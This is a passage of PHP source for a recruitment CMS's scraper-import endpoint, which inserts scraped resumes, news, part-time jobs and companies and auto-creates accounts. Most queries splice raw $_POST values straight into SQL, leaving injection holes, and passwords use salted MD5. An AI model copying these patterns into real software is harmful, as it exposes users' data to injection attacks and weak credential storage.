					$edu_title=explode('|||',$p['edu_title']);
					$edu_education=explode('|||',$p['edu_education']);
					foreach($edu_name as $key=>$value)
					{
					    $edu_v="`uid`='".$uid."',";
					    $edu_v.="`eid`='".$nid."',";
					    $edu_v.="`name`='".trim(!empty($value)?$value:'未添加工作经验')."',";
						$edu_sdate[$key]=str_replace(array('年','月','日','.','－','_'),'-',$edu_sdate[$key]);
						$edu_edate[$key]=str_replace(array('年','月','日','.','－','_'),'-',$edu_edate[$key]);
						if(substr($edu_sdate[$key], -1)=='-'){$edu_sdate[$key].='01';}
					    if(substr($edu_edate[$key], -1)=='-'){$edu_edate[$key].='01';}
						$edu_v.="`sdate`='".strtotime($edu_sdate[$key])."',";
					    $edu_v.="`edate`='".strtotime($edu_edate[$key])."',";
						$edu_v.="`specialty`='".$edu_specialty[$key]."',";
				        $edu_v.="`content`='".$edu_content[$key]."',";
					    $edu_v.="`title`='".$edu_title[$key]."',";						
						$education=$this->locoytostr($this->get_user_type('edu'),$edu_education[$key],$l['locoy_rate']);
			            if(!$education){$education=$l['locoy_user_edu'];}						
						$edu_v.="`education`='".$education."'";
					    !empty($value)?$this->obj->DB_insert_once("resume_edu",$edu_v):'';
					}
				}
				//获取证书
				if($p['cert_name'] || $p['cert_title']){
				    $cert_name=explode('|||',$p['cert_name']);
					$cert_sdate=explode('|||',$p['cert_sdate']);
					$cert_content=explode('|||',$p['cert_content']);
					$cert_title=explode('|||',$p['cert_title']);
					foreach($cert_name as $key=>$value)
					{
					    $cert_v="`uid`='".$uid."',";
					    $cert_v.="`eid`='".$nid."',";
					    $cert_v.="`name`='".trim(!empty($value)?$value:'未添加工作经验')."',";
						$cert_sdate[$key]=str_replace(array('年','月','日','.','－','_'),'-',$cert_sdate[$key]);
						if(substr($cert_sdate[$key], -1)=='-'){$cert_sdate[$key].='01';}
						$cert_v.="`sdate`='".strtotime($cert_sdate[$key])."',";
				        $cert_v.="`content`='".$cert_content[$key]."',";
					    $cert_v.="`title`='".$cert_title[$key]."'";
					    !empty($value)?$this->obj->DB_insert_once("resume_cert",$cert_v):'';
					}					
				}
				//其它信息
				if($p['other_content'] || $p['other_title']){
				    $other_content=explode('|||',$p['other_content']);
					$other_title=explode('|||',$p['other_title']);
					foreach($other_content as $key=>$value)
					{
					    $other_v="`uid`='".$uid."',";
					    $other_v.="`eid`='".$nid."',";
					    $other_v.="`content`='".trim(!empty($value)?$value:'未添加工作经验')."',";
					    $other_v.="`name`='".$other_title[$key]."'";
					    !empty($value)?$this->obj->DB_insert_once("resume_other",$other_v):'';
					}	
				}
				//培训经历
				if($p['train_name'] || $p['train_title']){
					$train_name=explode('|||',$p['train_name']);
					$train_sdate=explode('|||',$p['train_sdate']);
					$train_edate=explode('|||',$p['train_edate']);
					$train_content=explode('|||',$p['train_content']);
					$train_title=explode('|||',$p['train_title']);
					foreach($train_name as $key=>$value)
					{
					    $train_v="`uid`='".$uid."',";
					    $train_v.="`eid`='".$nid."',";
					    $train_v.="`name`='".trim(!empty($value)?$value:'未添加工作经验')."',";
						$train_sdate[$key]=str_replace(array('年','月','日','.','－','_'),'-',$train_sdate[$key]);
						$train_edate[$key]=str_replace(array('年','月','日','.','－','_'),'-',$train_edate[$key]);
						if(substr($train_sdate[$key], -1)=='-'){$train_sdate[$key].='01';}
					    if(substr($train_edate[$key], -1)=='-'){$train_edate[$key].='01';}
						$train_v.="`sdate`='".strtotime($train_sdate[$key])."',";
					    $train_v.="`edate`='".strtotime($train_edate[$key])."',";
				        $train_v.="`content`='".$train_content[$key]."',";
					    $train_v.="`title`='".$train_title[$key]."'";
					    !empty($value)?$this->obj->DB_insert_once("resume_training",$train_v):'';
					}					
				}				
				exit("添加成功");
			}
	}
	//添加用户信息
	
	function add_user_info($p,$l){
		$row=$this->obj->DB_select_once("resume","`telphone`='".$p['info_telphone']."'");	
		$version=getversion("v","B");	
		if(is_array($row)){
			return $row['uid'];
		}else{			
			$userid=$this->add_user($p,$l);			
			$where['uid']=$userid;
			$data['resumetime']=$data['lastupdate']=time();
			$data['name']=trim($p['info_name']);
			$data['address']=trim($p['info_address']);
			$data['height']=trim($p['info_height']);
			$data['weight']=trim($p['info_weight']);
			$data['birthday']=$this->birthday($p['info_birthday']);            
			$data['telphone']=$p['info_telphone'];
			$data['moblie_status']=$this->isEmpty($data['telphone'])?0:1;
			$data['homepage']=$p['info_homepage'];			
			$info_description=strip_tags(html_entity_decode($p['info_description']),"<p> <br>");
			$data['description']=$info_description;
			$data['living']=$p['info_living'];
			$data['domicile']=$p['info_domicile'];
			$data['email']=$p['info_email'];
			$data['tag']=$p['info_tag'];
            $data['email_status']=$this->isEmpty($data['email'])?0:1;			
			$picurl=get_one_pic($p['info_photo'],"/data/upload/user/","/data/upload/user/");
			$data['photo']=$picurl['photo'];
			$data['resume_photo']=$picurl['resume_photo'];						
			$data['sex']=$this->locoytostr($this->get_user_type('sex'),$p['info_sex'],$l['locoy_rate']);			
			if($version>=4.3){
			    $data['sex']=($p['info_sex']=='男')?1:2;
				$data['r_status']=$l['locoy_user_status']==1?$l['locoy_user_status']:0;
			}else{
			    $data['sex']=$this->locoytostr($this->get_user_type('sex'),$p['info_sex'],$l['locoy_rate']);
			    if(!$data['sex']){
				    $data['sex']=$l['locoy_user_sex'];
			    }
			}				
			$data['marriage']=$this->locoytostr($this->get_user_type('marriage'),$p['info_marriage'],$l['locoy_rate']);
			if(!$data['marriage']){
				$data['marriage']=$l['locoy_user_marriage'];
			}
			$data['edu']=$this->locoytostr($this->get_user_type('edu'),$p['info_edu'],$l['locoy_rate']);
			if(!$data['edu']){
				$data['edu']=$l['locoy_user_edu'];
			}
			$data['exp']=$this->locoytostr($this->get_user_type('word'),$p['info_exp'],$l['locoy_rate']);
			if(!$data['exp']){
				$data['exp']=$l['locoy_user_exp'];
			}
			if(!$p['nationality']){
				$data['nationality']=$l['locoy_user_nationality'];
			}else{
				$data['nationality']=$p['nationality'];
			}					
			$nid=$this->obj->update_once("resume",$data,$where);			
			return $userid;
		}
	}
	function birthday($str){
        $str=str_replace(array('年','月','日','.','/','－','_'),'-',$str);
		$nianyueri=explode('-',rtrim($str,'-'));
		$birthage=intval($nianyueri[0]);
		if($birthage<100){
			$nian=intval(@date('Y')-$birthage);
		}else{
			$nian=intval($birthage)>1945?intval($birthage):exit('请正确填写出生年份');
			}	
		$yue=count($nianyueri)>1?$nianyueri[1]:rand(1,12);
		$ri=count($nianyueri)>2?$nianyueri[2]:rand(1,28);
		return $nian.'-'.$yue.'-'.$ri;
    }
    function isEmpty($str){
	    if(is_array($str)){
		    return false;
		}else{
	        return (trim($str)=='')?true:false;
		}
	}	
	function get_max_min($num,$type){
		$res=array();
		$arr=explode('|||',str_replace(array('年','月','日','.','－','_'),'-',$num));
		foreach($arr as $value){
			$res[]=@strtotime($value);
		}
		return $type?max($res):min($res);
	}
	//添加用户
	function add_user($p,$l){
		$ip = fun_ip_get();
		$time = time();
		$salt = substr(uniqid(rand()),-6);
		$ps=$this->isEmpty(trim($_POST['password']))?$l['locoy_pwd']:trim($_POST['password']);
		$pass = md5(md5($ps).$salt);		
		$username=$this->isEmpty(trim($_POST['username']))?$this->get_username($l):trim($_POST['username']);
		if($l['locoy_user_status']==1){
			$satus=1;
		}
		$userid=$this->obj->DB_insert_once("member","`username`='".$username."',`password`='$pass',`moblie`='".$p['info_telphone']."',`email`='".$p['info_email']."',`usertype`='1',`status`='$satus',`salt`='$salt',`reg_date`='$time',`login_date`='$time',`reg_ip`='$ip',`source`='6'");
		$value="`uid`='$userid'";
		$this->obj->DB_insert_once("resume",$value);
		$this->obj->DB_insert_once("member_statis",$value);
		$this->obj->DB_insert_once("friend_info","`uid`='".$userid."',`nickname`='".$username."',`usertype`='1'");
		return $userid;
	}
	//获取用户名
	function get_username($l){
		$row = array("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","0","1","2","3","4","5","6","7","8","9");
		$va="";
		for($i=0;$i<$l['locoy_length'];$i++){
			$rand=rand(0,61);
			$va.=$row[$rand];
		}
		$data=$l['locoy_name'].$va;
		return $data;
	}
	//获取城市
	function get_city($name,$locoy_rate){
		include(PLUS_PATH."city.cache.php");
		$name = str_replace(array('/','-',','),'',trim($name));
		$name=str_replace(array("省","市","县","区"),"/",$name);
		$arr=explode("/",$name);
		if(is_array($arr)){
			foreach($arr as $v){
				$data[]=$this->locoytostr($city_name,$v,$locoy_rate);
			}
		}
		$city_type[0]=$city_index;
		$val=$this->get_all_city($city_type,$data,$locoy_rate);
		if(count($val)==1){
			$val[]=$this->get_once_city($city_type,$city_name,$val[0],$locoy_rate);
		}
		return $val;
	}
	//获取职位类别4.6以前的版本
	function get_job_class1($name,$locoy_rate){
		include(PLUS_PATH."job.cache.php");
		$arr=explode(",",$name);
		if(is_array($arr)){
			foreach($arr as $v){
				$data[]=$this->locoytostr($job_name,$v,$locoy_rate);
			}
		}
		return $data;
	}	
	//获取职位类别
	function get_job_class($name,$locoy_rate){
		include(PLUS_PATH."job.cache.php");
		$arr=explode("/",$name);
		if(is_array($arr)){
			foreach($arr as $v){
				$data[]=$this->locoytostr($job_name,$v,$locoy_rate);
			}
		}
		$job_type[0]=$job_index;
		$val=$this->get_all_city($job_type,$data,$locoy_rate);
		if(count($val)==1){
			$val[]=$this->get_once_city($job_type,$job_name,$val[0],$locoy_rate);
		}
		return $val;
	}
	
	
	
	
	//循环获取城市
	function get_all_city($city_type,$data,$locoy_rate,$k=""){
		if(is_array($data)){
			foreach($data as $v){
				foreach($city_type as $key=>$value){
					$a=$k?$k:$v;
					if(in_array($a,$value)){
						if($key){
							$val=$this->get_all_city($city_type,$data,$locoy_rate,$key);
						}
						$val[$key]=$a;
					}
				}
			}
		}
		return $val;
	}
	//获取单个城市
	function get_once_city($t,$n,$id,$locoy_rate){
		$row=$n[$id];
		if(is_array($t[$id])){
			foreach($t[$id] as $k=>$v){
				$array[$v]=$n[$v];
			}
		}
		$r=$this->locoytostr($array,$row,$locoy_rate);
		return $r;
	}
	//获取用户类型
	function get_user_type($cat){
		include(PLUS_PATH."user.cache.php");
		foreach($userdata["user_".$cat] as $v){
			$data[$v]=$userclass_name[$v];
		}
		return $data;
	}
	//匹配度
	function locoytostr($arr,$str,$locoy_rate="60"){
			$str_array=$this->tostring($str);
			foreach($arr as $key =>$list){
				$h=0;
				foreach($str_array as $val){
					if(substr_count($list,$val))$h++;
				}
				$categoryname_array=$this->tostring($list);
				$j=round($h/count($categoryname_array)*100,2);
				$rows[$j]=$key;
			}
			krsort($rows);
			foreach($rows as $k =>$v){			 
				if ($k>=$locoy_rate){
					return $v;
				}else{
					return false;
				}					
			}
	}
	//转换编码
	function tostring($string){ 
		$length=strlen($string); 
		$retstr=''; 
		for($i=0;$i<$length;$i++) { 
			$retstr[]=ord($string[$i])>127?$string[$i].$string[++$i]:$string[$i]; 
		} 
		return $retstr; 
	}
}
//创建一个新闻类
class news_controller extends common{

    function get_sort(){//获取新闻分类
	    $show="<ul>\n";
	    $news_group=$this->obj->DB_select_all("news_group","`keyid`='0'");
	    if(is_array($news_group)){
		   foreach($news_group as $key=>$v){
		   $show .= "<option value='".$v['id']."'>".$v['name']."</option>"; 
		   $news_small_group=$this->obj->DB_select_all("news_group","`keyid`='".$v['id']."'");  
		   if(is_array($news_small_group)){
		     foreach($news_small_group as $key=>$vr){$show .= "<option value='".$vr['id']."'>&nbsp;&nbsp;".$vr['name']."</option>";}
			}
		}  
	}
	$show .= "</ul>";
	return $show;
	}	
	function addnews_action(){//新闻添加
		file_exists(APP_PATH.'data/api/locoy/locoy_config.php')?include(APP_PATH.'data/api/locoy/locoy_config.php'):include(APP_PATH."api/locoy/locoy_config.php");
		if($locoyinfo['locoy_online']!=1){exit("请在网站后台开启火车头采集");}
        if(!$_POST['title'] || !$_POST['content'] || !$_POST['nid']){exit("标题或新闻内容不能为空");}		
		$row=$this->obj->DB_select_once("news_base","`title`='".trim($_POST['title'])."' and `nid`='".$_POST['nid']."'");
		if(is_array($row)){exit("该新闻已经存在！");}	
		$content=get_content(str_replace(array("“","”"),"\"",$_POST['content']),"/data/upload/ueditor/");
		$value="";
        $value.="`title`='".trim($_POST['title'])."',";
		$value.="`nid`='".$_POST['nid']."',";
		$value.=trim($_POST['did'])?"`did`='".trim($_POST['did'])."',":"`did`='0',";
		$value.="`author`='".$_POST['author']."',";
		$description=mb_substr(strip_tags(html_entity_decode($content,ENT_NOQUOTES,"GB2312")),0,180,"gbk");
		$description=$_POST['description']?$_POST['description']:$description;
		$description=str_replace(array(' ',"\n","\r","\r\n"," "),array(''),$description);
		$value.="`description`='".$description."',";
		$value.="`source`='".$_POST['source']."'";
		if($_POST['ctime']){
			$value.=",`datetime`='".strtotime($_POST['ctime'])."'";
		}else{
			$value.=",`datetime`='".time()."'";
		}
		if($_POST['hits']){
			$value.=",`hits`='".trim($_POST['hits'])."'";
		}else{
			$row=explode('-',$locoyinfo['locoy_rand']);
			if(is_array($row)){
				$rand=rand(trim($row[0]),trim($row[1]));
			}else{
				$rand=!trim($row)?0:$row;
			}
			$value.=",`hits`='".$rand."'";
		}
		if($_POST['sort']){
			$value.=",`sort`='".trim($_POST['sort'])."'";
		}else{
			$row=explode('-',$locoyinfo['locoy_sort']);
			if(is_array($row)){
				$rand=rand(trim($row[0]),trim($row[1]));
			}else{
				$rand=!trim($row)?0:$row;
			}
			$value.=",`sort`='".$rand."'";
		}
		$picurl=trim($_POST['newsphoto'])?get_one_pic(trim($_POST['newsphoto']),"/data/upload/news/","/data/upload/news/"):get_one_pic(stripslashes(trim($_POST['content'])),"/data/upload/news/","/data/upload/news/");
			$value.=",`newsphoto`='".$picurl['photo']."'";
			$value.=",`s_thumb`='".$picurl['resume_photo']."'";		
			$value.=",`keyword`='".str_replace("，",",",$_POST['keyword'])."'";
     	$new_base = $this->obj->DB_insert_once("news_base",$value);
        $news_content = get_mydomain()?$this->obj->DB_insert_once("news_content", "`nbid`='$new_base',`content`='$content'"):'';
		if($new_base){exit("添加成功");
		}else{exit("添加失败");}
	}
}

//创建一个兼职类
class partjob_controller extends common{	
	function add_action(){	
		file_exists(APP_PATH.'data/api/locoy/locoy_config.php')?include(APP_PATH.'data/api/locoy/locoy_config.php'):include(APP_PATH."api/locoy/locoy_config.php");
		if($locoyinfo['locoy_online']!=1){exit("请在网站后台开启火车头采集");}
        if(!$_POST['part_name'] || !$_POST['com_name']){exit("职位或公司名称不能为空");}
		$uid=get_mydomain()?$this->add_com($_POST,$locoyinfo):'';
		$this->add_partjob($_POST,$locoyinfo,$uid);
	}	
	function add_partjob($p,$l,$uid){
		$data['uid']=$uid;
		$data['name']=$p['part_name']; 
		$data['lastupdate']=mktime();  
		$data['state']=$l['locoy_partjob_status'];
		$data['content'] = strip_tags(html_entity_decode($p['partcontent'],ENT_NOQUOTES,"GB2312"),"<p> <br>");		  
		$chenk_row=$this->obj->DB_select_once("partjob","`name`='".$data['name']."' and `uid`='".$uid."'");
		if(is_array($chenk_row)){exit("你已发布过该职位了");}
		include(PLUS_PATH."industry.cache.php");
		include(PLUS_PATH."part.cache.php");			
		$city=$p['job_city']?$p['job_city']:$p['city'];
		$city_row=$this->get_city($city,$l['locoy_rate']);
			if($city_row){
				$i=1;
				foreach($city_row as $v){
					if($i==1)$data['provinceid']=$v;
					if($i==2)$data['cityid']=$v;
					if($i==3)$data['three_cityid']=$v;
					$i++;
				}
			}else{
				$data['provinceid']=$l['locoy_job_province'];
				$data['cityid']=$l['locoy_job_city'];
				$data['three_cityid']=$l['locoy_job_three'];
			}
		if($p['sdate']){
			$data['sdate']=strtotime($p['sdate']);
		}else{
			$data['sdate']=mktime();
		}
		if($p['edate']){
			$data['edate']=strtotime($p['edate']);
		}else{
			$data['edate']=0;
		}
		$data['worktime']=$p['worktime'];	 		
		$data['number']=$p['number'];
		if(!$data['number']){
			$data['number']=$l['locoy_job_number'];
		}		
        $data['sex']=$this->getResumeSex($p['sex']);	
		$data['type']=$this->locoytostr($partclass_name,$p['job_cate'],$l['locoy_rate']);
		if(!$data['type']){
			$data['type']=$l['locoy_part_type'];
		}		
		$data['salary']=$p['salary'];
		$data['salary_type']=$this->locoytostr($partclass_name,$p['salary_type'],$l['locoy_rate']);	
		if(!$data['salary_type']){
			$data['salary_type']=$l['locoy_part_salary']; 
		}		
		$com=$this->obj->DB_select_once("company","`uid`='".$uid."'");
		$data['com_name']=$com['name'];
		$data['billing_cycle']=$this->locoytostr($partclass_name,$p['part_billing'],$l['locoy_rate']);		
		$data['address']=trim($p['address']);
		$data['x']=$p['x'];
	    $data['y']=$p['y'];
		$data['deadline']=mktime()+604800;
		$data['linkman']=$p['linkman'];
	    $data['linktel']=$p['linktel'];
	    $data['statusbody']=0;
		$row=explode('-',$l['locoy_part_hits']);
		if(count($row)>1){
			$rand=rand(trim($row[0]),trim($row[1]));
		}else{
			$rand=trim($row[0]);
		}
	    $data['hits']=$rand;
	    $data['rec_time']=0;
	    $data['did']=0;				
		$nid=$this->obj->insert_into("partjob",$data);
		if($this->config['com_job_status']=="1"){
			$this->send_dingyue($nid,2);
		}
		$this->obj->DB_update_all("company","`lastupdate`='".$p['lastupdate']."'","`uid`='".$uid."'");
		exit("添加成功");
	}

	function add_com($p,$l){
		$row=$this->obj->DB_select_once("company","`name`='".$p['com_name']."'");
		if(is_array($row)){
			return $row['uid'];
		}else{		
			$userid=$this->add_user($p,$l);			
			$where['uid']=$userid;
			$data['name']=trim($p['com_name']);
			$data['address']=trim($p['address']);
			$data['linkphone']=trim($p['linkphone']);
			$data['moblie_status']=$this->isEmpty($data['linkphone'])?0:1;
			$data['linkmail']=trim($p['email']);
			$data['email_status']=$this->isEmpty($data['linkmail'])?0:1;
			$data['zip']=trim($p['zip']);
			$data['linkman']=trim($p['linkman']);
			$data['linkjob']=trim($p['linkjob']);
			$data['linkqq']=trim($p['linkqq']);
			$data['linktel']=trim($p['moblie']);
			$data['website']=trim($p['website']);
			if($p['com_sdate']){
				$data['sdate']=date("Y-m-d",strtotime(trim($p['com_sdate'])));
			}
			$money=str_replace(array("元","美元","￥","$"),"",trim($p['money']));
			if(!$money)$money=$l['locoy_com_money'];
			$data['money']=$money;
			$data['content'] = strip_tags(html_entity_decode($p['content'],ENT_NOQUOTES,"GB2312"),"<p> <br>");
			$data['lastupdate']=mktime();

			include(PLUS_PATH."industry.cache.php");
			$data['hy']=$this->locoytostr($industry_name,$p['hy'],$l['locoy_rate']);
			if(!$data['hy']){
				$data['hy']=$l['locoy_com_hy'];
			}
			$data['pr']=$this->locoytostr($this->get_com_type('pr'),$p['pr'],$l['locoy_rate']);
			if(!$data['pr']){
				$data['pr']=$l['locoy_com_pr'];
			}
			$data['mun']=$this->locoytostr($this->get_com_type('mun'),$p['mun'],$l['locoy_rate']);
			if(!$data['mun']){
				$data['mun']=$l['locoy_com_mun'];
			}
			$city_row=$this->get_city($p['city'],$l['locoy_rate']);
			if($city_row){
				$i=1;
				foreach($city_row as $v){
					if($i==1)$data['provinceid']=$v;
					if($i==2)$data['cityid']=$v;
					$i++;
				}
			}else{
				$data['provinceid']=$l['locoy_com_province'];
				$data['cityid']=$l['locoy_com_city'];
			}
			$nid=$this->obj->update_once("company",$data,$where);
			return $userid;
		}
	}
//匹配简历性别
	function getResumeSex($sex_cn=NULL){
		if($sex_cn=="男"){
			$id=1;
		}elseif($sex_cn=="女"){
			$id=2;
		}elseif($sex_cn=="不限"){
			$id=3;
		}
		else{
			$id=3;
		}
		return $id;
	}	
	function isEmpty($str){
	    if(is_array($str)){
		    return false;
		}else{
	        return (trim($str)=='')?true:false;
		}
	}
	function add_user($p,$l){
		$version=getversion("v","B");	
		$ip = fun_ip_get();		
		$time = time();		
		$salt = substr(uniqid(rand()),-6);
		$ps=$this->isEmpty(trim($_POST['password']))?$l['locoy_pwd']:trim($_POST['password']);
		$pass = md5(md5($ps).$salt);		
		$username=$this->isEmpty(trim($_POST['username']))?$this->get_username($l):trim($_POST['username']);		
		if($l['locoy_user_status']==1){
			$satus=1;
		}		
		$userid=$this->obj->DB_insert_once("member","`username`='".$username."',`password`='$pass',`moblie`='".$p['moblie']."',`email`='".$p['email']."',`usertype`='2',`status`='$satus',`salt`='$salt',`reg_date`='$time',`login_date`='$time',`reg_ip`='$ip',`source`='6'");		
		if($version>=4.5){
			$ratingM = $this->MODEL('rating');
		    $value="`uid`='$userid',".$ratingM->rating_info($l['locoy_rating']);
		}else{
			$value="`uid`='$userid',".$this->rating_info($l['locoy_rating']);
		}	
		$value2 = "`uid`='$userid',`linkmail`='".$p['email']."',`name`='".$p['com_name']."',`linktel`='".$p['moblie']."',`address`='".$_POST['address']."'";
		$this->obj->DB_insert_once("company_statis",$value);
		$this->obj->DB_insert_once("company",$value2);
		return $userid;
	}
	function get_username($l){
		$row = array("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","0","1","2","3","4","5","6","7","8","9");
		$va="";
		for($i=0;$i<$l['locoy_length'];$i++){
			$rand=rand(0,61);
			$va.=$row[$rand];
		}
		$data=$l['locoy_name'].$va;
		return $data;
	}
	function rating_info($id)
	{
		$id =$this->config['com_rating'];
		$row = $this->obj->DB_select_once("company_rating","`id`='".$id."'");
		$value="`rating`='$id',";
		$value.="`integral`='".$this->config['integral_reg']."',";
		$value.="`rating_name`='".$row["name"]."',";
		$value.="`vip_stime`='".time()."',";
		if($row['type']==1){
			$value.="`job_num`='".$row["job_num"]."',";
			$value.="`down_resume`='".$row["resume"]."',";
			$value.="`invite_resume`='".$row["interview"]."',";
			$value.="`editjob_num`='".$row["editjob_num"]."',";
			$value.="`breakjob_num`='".$row["breakjob_num"]."'";
		}else{
			$time=time()+86400*$row['service_time'];
			$value.="`vip_etime`='".$time."'";
		}
		return $value;
	}
	function get_city($name,$locoy_rate){
		include(PLUS_PATH."city.cache.php");
		$name=str_replace(array("省","市","县","区"),"/",$name);
		$arr=explode("/",$name);
		if(is_array($arr)){
			foreach($arr as $v){
				$data[]=$this->locoytostr($city_name,$v,$locoy_rate);
			}
		}
		$city_type[0]=$city_index;
		$val=$this->get_all_city($city_type,$data,$locoy_rate);
		if(count($val)==1){
			$val[]=$this->get_once_city($city_type,$city_name,$val[0],$locoy_rate);
		}
		return $val;
	}
	function get_job_class($name,$locoy_rate){
		include(PLUS_PATH."job.cache.php");
		$arr=explode("/",$name);
		if(is_array($arr)){
			foreach($arr as $v){
				$data[]=$this->locoytostr($job_name,$v,$locoy_rate);
			}
		}
		$job_type[0]=$job_index;
		$val=$this->get_all_city($job_type,$data,$locoy_rate);
		if(count($val)==1){
			$val[]=$this->get_once_city($job_type,$job_name,$val[0],$locoy_rate);
		}
		return $val;
	}
	function get_all_city($city_type,$data,$locoy_rate,$k=""){
		if(is_array($data)){
			foreach($data as $v){
				foreach($city_type as $key=>$value){
					$a=$k?$k:$v;
					if(in_array($a,$value)){
						if($key){
							$val=$this->get_all_city($city_type,$data,$locoy_rate,$key);
						}
						$val[$key]=$a;
					}
				}
			}
		}
		return $val;
	}
	function get_once_city($t,$n,$id,$locoy_rate){
		$row=$n[$id];
		if(is_array($t[$id])){
			foreach($t[$id] as $k=>$v){
				$array[$v]=$n[$v];
			}
		}
		$r=$this->locoytostr($array,$row,$locoy_rate);
		return $r;
	}
	function get_com_type($cat){
		include(PLUS_PATH."com.cache.php");
		foreach($comdata["job_".$cat] as $v){
			$data[$v]=$comclass_name[$v];
		}
		return $data;
	}
	function locoytostr($arr,$str,$locoy_rate="50"){
		foreach($arr as $key=>$value)
		{
			similar_text($str,$value,$percent);

			$rows[$percent]=$key;
			$aaa[$percent] = $value;
		}
		krsort($rows);
		foreach($rows as $k =>$v){
			if ($k>=$locoy_rate){
				return $v;
			}else{
				return false;
			}
		}
	}
	function tostring($string){
		$length=strlen($string);
		$retstr=array();
		for($i=0;$i<$length;$i++) {
			$retstr[]=ord($string[$i])>127?$string[$i].$string[++$i]:$string[$i];
		}
		return $retstr;
	}
}
	if($act=="resumes")
    {
	    $views=new user_controller($phpyun,$db,$db_config[def],"index");
        if(!method_exists($views,add_action)){exit("您请求的页面不存在！可能防火墙阻止");}
        $views->add_action();
    }
	elseif($act=="job")
	{
	    $views=new job_controller($phpyun,$db,$db_config[def],"index");
        if(!method_exists($views,add_action)){exit("您请求的页面不存在！可能防火墙阻止");}
        $views->add_action();
	}
	elseif($act=="partjob")
	{
	    $views=new partjob_controller($phpyun,$db,$db_config[def],"index");
        if(!method_exists($views,add_action)){exit("您请求的页面不存在！可能防火墙阻止");}
        $views->add_action();
	}
	elseif($act=="news")
	{
	    $views=new news_controller($phpyun,$db,$db_config[def],"index");
        if(!method_exists($views,addnews_action)){exit("您请求的页面不存在！可能防火墙阻止");}
		if(empty($_POST))
        {
	      echo "<select name='list'>";
	      echo $views->get_sort();
	      echo '</select>';
	      exit();
        }
        $views->addnews_action();
	}
